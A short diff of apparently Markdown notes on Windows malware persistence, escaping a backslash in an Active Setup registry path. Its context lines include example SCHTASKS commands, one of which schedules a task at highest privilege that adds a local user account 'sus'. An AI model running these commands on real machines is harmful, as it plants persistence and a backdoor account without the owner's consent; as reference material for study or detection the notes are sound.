@@ -9,7 +9,7 @@
     - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
     - HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
 - Active Setup
-    - HKLM\Software\Microsoft\Active Setup\Installed Components\{Malware}
+    - HKLM\Software\Microsoft\Active Setup\Installed Components\\{Malware}
 - Scheduled Tasks
     - SCHTASKS /CREATE /SC HOURLY /TN "System\Setup" /TR "C:\Windows\Temp\setup.bat" /F
     - SCHTASKS /CREATE /SC DAILY /TN "System\Nothing" /TR "cmd /C 'net user sus sus /add'" /RL HIGHEST /F
